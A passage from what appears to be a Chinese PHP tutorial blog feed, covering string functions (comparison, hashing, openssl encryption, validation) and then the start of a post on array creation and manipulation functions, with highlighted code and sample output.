strpos()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;首次出现位置: &quot;</span> . <span class="title function_ invoke__">strpos</span>(<span class="variable">$baseString</span>, <span class="string">&quot;world&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 1. 字符串比较 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;1. 字符串比较&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// strcmp()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;区分大小写比较: &quot;</span> . <span class="title function_ invoke__">strcmp</span>(<span class="variable">$str1</span>, <span class="variable">$str2</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// -32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strcasecmp()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不区分大小写比较: &quot;</span> . <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$str1</span>, <span class="variable">$str2</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strncmp()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;前3字符比较: &quot;</span> . <span class="title function_ invoke__">strncmp</span>(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;appetite&quot;</span>, <span class="number">3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strncasecmp()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;前3字符不区分大小写: &quot;</span> . <span class="title function_ invoke__">strncasecmp</span>(<span class="string">&quot;APPLE&quot;</span>, <span class="string">&quot;appetite&quot;</span>, <span class="number">3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 2. 搜索与替换 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;2. 搜索与替换&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$searchStr</span> = <span class="string">&quot;Hello, world! Welcome to the world of PHP.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// strpos()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;首次出现位置: &quot;</span> . <span class="title function_ invoke__">strpos</span>(<span class="variable">$searchStr</span>, <span class="string">&quot;world&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strrpos()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;最后出现位置: &quot;</span> . <span class="title function_ invoke__">strrpos</span>(<span class="variable">$searchStr</span>, <span class="string">&quot;world&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 3. 字符串操作 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;3. 字符串操作&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$manipulateStr</span> = <span class="string">&quot;hello, world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// strtoupper()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;大写: &quot;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$manipulateStr</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// HELLO, WORLD!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strtolower()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;小写: &quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="string">&quot;HELLO&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ucfirst()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;首字母大写: &quot;</span> . <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$manipulateStr</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// Hello, world!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ucwords()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;单词首字母大写: &quot;</span> . <span class="title function_ invoke__">ucwords</span>(<span class="variable">$manipulateStr</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// Hello, World!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_repeat()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;重复字符串: &quot;</span> . <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;PHP &quot;</span>, <span class="number">3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// PHP PHP PHP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_shuffle()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;随机打乱: &quot;</span> . <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&quot;ABCD&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 随机结果如 &quot;BCDA&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_replace()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换操作: &quot;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="variable">$manipulateStr</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// hello, PHP!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 4. 字符串格式化 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;4. 字符串格式化&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sprintf()</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">28</span>;</span><br><span class="line"><span class="variable">$formatted</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;姓名: %s, 年龄: %d 岁&quot;</span>, <span class="variable">$name</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$formatted</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 姓名: Alice, 年龄: 28 岁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 5. 编码与哈希 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;5. 编码与哈希&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;Sensitive Data&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// base64_encode()</span></span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$secret</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Base64 编码: <span class="subst">$encoded</span>&lt;br&gt;&quot;</span>;  <span class="comment">// U2Vuc2l0aXZlIERhdGE=</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// base64_decode()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Base64 解码: &quot;</span> . <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encoded</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// Sensitive Data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// md5()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;MD5 哈希: &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 32位哈希值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sha1()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SHA1 哈希: &quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$secret</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 40位哈希值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hash()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SHA256 哈希: &quot;</span> . <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 64位哈希值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hash_hmac()</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;secret_key&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;HMAC-SHA256: &quot;</span> . <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>, <span class="variable">$key</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 带密钥的哈希</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 6. 加密与解密 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;6. 加密与解密&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$plaintext</span> = <span class="string">&quot;Confidential Info&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;my_secret_key_123&quot;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>);  <span class="comment">// 初始化向量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openssl_encrypt()</span></span><br><span class="line"><span class="variable">$ciphertext</span> = <span class="title function_ invoke__">openssl_encrypt</span>(</span><br><span class="line">    <span class="variable">$plaintext</span>,</span><br><span class="line">    <span class="string">&#x27;aes-256-cbc&#x27;</span>,</span><br><span class="line">    <span class="variable">$key</span>,</span><br><span class="line">    OPENSSL_RAW_DATA,</span><br><span class="line">    <span class="variable">$iv</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$ciphertext</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;加密结果: <span class="subst">$encrypted</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// openssl_decrypt()</span></span><br><span class="line"><span class="variable">$decoded</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"><span class="variable">$ciphertext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="number">16</span>);</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">openssl_decrypt</span>(</span><br><span class="line">    <span class="variable">$ciphertext</span>,</span><br><span class="line">    <span class="string">&#x27;aes-256-cbc&#x27;</span>,</span><br><span class="line">    <span class="variable">$key</span>,</span><br><span class="line">    OPENSSL_RAW_DATA,</span><br><span class="line">    <span class="variable">$iv</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;解密结果: <span class="subst">$decrypted</span>&lt;br&gt;&quot;</span>;  <span class="comment">// Confidential Info</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 7. 字符串转换 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;7. 字符串转换&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bin2hex()</span></span><br><span class="line"><span class="variable">$binary</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"><span class="variable">$hex</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$binary</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制: <span class="subst">$hex</span>&lt;br&gt;&quot;</span>;  <span class="comment">// 504850</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hex2bin()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;二进制还原: &quot;</span> . <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// PHP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 8. 字符串验证 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;8. 字符串验证&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ctype_alnum()</span></span><br><span class="line"><span class="variable">$test1</span> = <span class="string">&quot;Hello123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$test1</span>&#x27; 是否字母数字: &quot;</span> . (<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$test1</span>) ? <span class="string">&quot;是&quot;</span> : <span class="string">&quot;否&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ctype_alpha()</span></span><br><span class="line"><span class="variable">$test2</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$test2</span>&#x27; 是否纯字母: &quot;</span> . (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$test2</span>) ? <span class="string">&quot;是&quot;</span> : <span class="string">&quot;否&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ctype_digit()</span></span><br><span class="line"><span class="variable">$test3</span> = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$test3</span>&#x27; 是否纯数字: &quot;</span> . (<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$test3</span>) ? <span class="string">&quot;是&quot;</span> : <span class="string">&quot;否&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ctype_space()</span></span><br><span class="line"><span class="variable">$test4</span> = <span class="string">&quot; \t\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$test4</span>&#x27; 是否空白符: &quot;</span> . (<span class="title function_ invoke__">ctype_space</span>(<span class="variable">$test4</span>) ? <span class="string">&quot;是&quot;</span> : <span class="string">&quot;否&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ctype_xdigit()</span></span><br><span class="line"><span class="variable">$test5</span> = <span class="string">&quot;1aF3&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$test5</span>&#x27; 是否十六进制字符: &quot;</span> . (<span class="title function_ invoke__">ctype_xdigit</span>(<span class="variable">$test5</span>) ? <span class="string">&quot;是&quot;</span> : <span class="string">&quot;否&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 是</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（五）</title>
      <link href="/2025/07/22/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2025/07/22/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（五）"><a href="#PHP基础入门（五）" class="headerlink" title="PHP基础入门（五）"></a>PHP基础入门（五）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><p>​在前面的<a href="https://moshsasa.github.io/2025/07/15/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/">PHP基础入门（二）</a>中我们已经简单了解了有关于PHP数组的一些基础概念，这篇文章将展示关于PHP数组array的一些方法。</p><h2 id="1-创建和修改数组"><a href="#1-创建和修改数组" class="headerlink" title="1. 创建和修改数组"></a>1. 创建和修改数组</h2><h3 id="1-1-创建基础数组"><a href="#1-1-创建基础数组" class="headerlink" title="1.1 创建基础数组"></a>1.1 创建基础数组</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array()</code></td><td align="center">创建新数组</td><td align="center"><code>$arr = array(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;);</code> 或 <code>$arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建基础数组</span></span><br><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;基础数组: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$fruits</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">基础数组: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; apple</span></span><br><span class="line"><span class="comment">    [1] =&gt; banana</span></span><br><span class="line"><span class="comment">    [2] =&gt; cherry</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-2-填充数组"><a href="#1-2-填充数组" class="headerlink" title="1.2 填充数组"></a>1.2 填充数组</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_fill()</code></td><td align="center">填充固定值数组</td><td align="center"><code>$arr = array_fill(0, 5, &quot;banana&quot;); // [0=&gt;&quot;banana&quot;, 1=&gt;&quot;banana&quot;...]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 填充数组</span></span><br><span class="line"><span class="variable">$filled</span> = <span class="title function_ invoke__">array_fill</span>(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&quot;orange&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;填充数组: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$filled</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">填充数组: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; orange</span></span><br><span class="line"><span class="comment">    [1] =&gt; orange</span></span><br><span class="line"><span class="comment">    [2] =&gt; orange</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-3-组合键值对"><a href="#1-3-组合键值对" class="headerlink" title="1.3 组合键值对"></a>1.3 组合键值对</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_combine()</code></td><td align="center">合并键数组和值数组</td><td align="center"><code>array_combine([&quot;a&quot;,&quot;b&quot;], [1,2]); // [&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组合键值对</span></span><br><span class="line"><span class="variable">$keys</span> = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="variable">$values</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable">$combined</span> = <span class="title function_ invoke__">array_combine</span>(<span class="variable">$keys</span>, <span class="variable">$values</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;组合数组: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$combined</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">组合数组: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [a] =&gt; 1</span></span><br><span class="line"><span class="comment">    [b] =&gt; 2</span></span><br><span class="line"><span class="comment">    [c] =&gt; 3</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-4-合并数组"><a href="#1-4-合并数组" class="headerlink" title="1.4 合并数组"></a>1.4 合并数组</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_merge()</code></td><td align="center">合并多个数组</td><td align="center"><code>array_merge([&quot;a&quot;,&quot;b&quot;], [&quot;c&quot;,&quot;d&quot;]); // [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 合并数组</span></span><br><span class="line"><span class="variable">$colors1</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line"><span class="variable">$colors2</span> = [<span class="string">&quot;blue&quot;</span>, <span class="string">&quot;yellow&quot;</span>];</span><br><span class="line"><span class="variable">$merged</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$colors1</span>, <span class="variable">$colors2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;合并数组: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$merged</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">合并数组: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; red</span></span><br><span class="line"><span class="comment">    [1] =&gt; green</span></span><br><span class="line"><span class="comment">    [2] =&gt; blue</span></span><br><span class="line"><span class="comment">    [3] =&gt; yellow</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-5-数组填充"><a href="#1-5-数组填充" class="headerlink" title="1.5 数组填充"></a>1.5 数组填充</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_pad()</code></td><td align="center">填充数组到指定长度</td><td align="center"><code>array_pad([&quot;a&quot;,&quot;b&quot;], 4, &quot;x&quot;); // [&quot;a&quot;,&quot;b&quot;,&quot;x&quot;,&quot;x&quot;]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组填充</span></span><br><span class="line"><span class="variable">$padded</span> = <span class="title function_ invoke__">array_pad</span>([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>], <span class="number">5</span>, <span class="string">&quot;fill&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;数组填充: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$padded</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">数组填充: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; a</span></span><br><span class="line"><span class="comment">    [1] =&gt; b</span></span><br><span class="line"><span class="comment">    [2] =&gt; fill</span></span><br><span class="line"><span class="comment">    [3] =&gt; fill</span></span><br><span class="line"><span class="comment">    [4] =&gt; fill</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-6-数组增删操作"><a href="#1-6-数组增删操作" class="headerlink" title="1.6 数组增删操作"></a>1.6 数组增删操作</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_push()</code></td><td align="center">末尾添加元素</td><td align="center"><code>array_push($arr, &quot;x&quot;, &quot;y&quot;);</code></td></tr><tr><td align="center"><code>array_unshift()</code></td><td align="center">开头添加元素</td><td align="center"><code>array_unshift($arr, &quot;x&quot;, &quot;y&quot;);</code></td></tr><tr><td align="center"><code>array_pop()</code></td><td align="center">移除最后一个元素</td><td align="center"><code>$last = array_pop($arr);</code></td></tr><tr><td align="center"><code>array_shift()</code></td><td align="center">移除第一个元素</td><td align="center"><code>$first = array_shift($arr);</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组增删操作</span></span><br><span class="line"><span class="variable">$stack</span> = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$stack</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>); <span class="comment">// 此时为[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</span></span><br><span class="line"><span class="title function_ invoke__">array_unshift</span>(<span class="variable">$stack</span>, <span class="string">&quot;start&quot;</span>); <span class="comment">// 此时为[&quot;start&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</span></span><br><span class="line"><span class="variable">$last</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$stack</span>); <span class="comment">// 此时为[&quot;start&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="variable">$first</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$stack</span>); <span class="comment">// 此时为[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;增删操作: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$stack</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">增删操作: 